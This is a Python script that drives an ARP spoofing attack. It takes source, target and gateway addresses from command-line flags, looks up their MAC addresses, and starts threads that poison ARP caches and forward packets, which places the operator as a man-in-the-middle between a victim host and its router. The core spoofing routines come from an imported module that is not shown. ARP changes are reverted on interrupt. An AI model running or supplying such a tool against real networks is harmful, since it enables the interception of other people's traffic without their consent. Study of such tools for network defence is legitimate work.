from spoof import *

def CheckFlags(required, arguments):
	for flag in required:
		if flag not in arguments: PrintMessage("Required flag criteria not met.", -1)

def CheckArguments(parameters):
	for argument in range(0, len(sys.argv)):
		match sys.argv[argument]:
			case '-s':
				parameters["Source"] = sys.argv[argument + 1]
			case '-t':
				parameters["Target"] = sys.argv[argument + 1]
			case '-g':
				parameters["Gateway"] = sys.argv[argument + 1]
			case '-l':
				parameters["Length"] = int(sys.argv[argument + 1])
			case '-d':
				parameters["Timeout"] = int(sys.argv[argument + 1])
	return parameters

source_mac  = None
target_mac  = None
gateway_mac = None

try:
	CheckFlags(REQUIRED_FLAGS, sys.argv)

	functional_parameters = {
		"Source":  None,
		"Target":  None,
		"Gateway": None,
		"Length":  None,
		"Timeout": None
	}

	functional_parameters["Length"]  = DEFAULT_LENGTH
	functional_parameters["Timeout"] = DEFAULT_TIMEOUT

	functional_parameters = CheckArguments(functional_parameters)

	source_mac  = GetMAC(functional_parameters["Source"], functional_parameters["Timeout"])
	target_mac  = GetMAC(functional_parameters["Target"], functional_parameters["Timeout"])
	gateway_mac = GetMAC(functional_parameters["Gateway"], functional_parameters["Timeout"])

	PrintMessage(f"Temporarily disguising as {functional_parameters["Target"]} for {functional_parameters["Length"]} second(s) and an abandon packet interval of {functional_parameters["Timeout"]} second(s)", 0)
	print("------------------------------")

	spoof_thread = threading.Thread(target=SpoofARP, args=(functional_parameters["Target"], functional_parameters["Gateway"], source_mac, target_mac, gateway_mac, functional_parameters["Length"]))
	forward_thread = threading.Thread(target=ForwardPacket, args=(functional_parameters["Target"], functional_parameters["Gateway"], target_mac, gateway_mac, functional_parameters["Length"]))

	spoof_thread.start()
	forward_thread.start()
	
except IndexError:
	PrintMessage("Source, target and router not specified.", -1)
except KeyboardInterrupt:
	ResetARP(functional_parameters["Target"], functional_parameters["Gateway"], target_mac, gateway_mac)
	PrintMessage("Interrupted. Reverting all ARP changes.", -1)
except ValueError:
	PrintMessage("There was an error. Please check the flag values you provided.", -1)